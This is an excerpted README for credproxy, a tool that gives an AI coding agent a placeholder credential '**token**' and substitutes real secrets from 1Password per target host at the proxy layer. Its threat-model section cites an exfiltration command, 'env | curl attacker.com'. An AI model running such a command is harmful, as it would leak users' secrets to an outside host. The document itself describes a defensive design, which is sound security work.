...
1. Giving the agent a single sentinel token (`**token**`) instead of real values
...
$ credproxy opencode
    ...
    │       ↓ swaps **token** → real key from 1Password
...
The agent uses a single sentinel string — `**token**` — as the credential value in any header, query parameter, or body field. credproxy matches on the **target host** to determine which credential to substitute, then replaces every occurrence of the sentinel in the request.
...
One token, one rule. The agent doesn't need to know which credential goes where — it just uses `**token**` for everything, and credproxy resolves the right secret based on the host being called.

The sentinel is configurable (`--sentinel` flag) but defaults to `**token**`.
...
6. If host is configured, credproxy replaces every occurrence of `**token**` with the resolved credential value
...
- **Casual credential exfiltration**: The agent only has `**token**` in its context. `env | curl`, config file reads, and header dumps all yield the sentinel, not real secrets.
...
No manual env vars. credproxy handles everything. The agent sees `HTTPS_PROXY` and `NO_PROXY` in its environment, and your agent instructions tell it to use `**token**` for API auth.
...
```
When making authenticated API calls, use **token** as the credential value.
...
--sentinel **token**     # sentinel string to substitute (default: **token**)
...
credproxy is about *whether the agent possesses secrets at all*. The agent never sees real values — only `**token**`, which credproxy swaps at the network layer.

An agent running under rex can `env | curl attacker.com` and exfiltrate every secret. Under credproxy, it can only exfiltrate `**token**`.
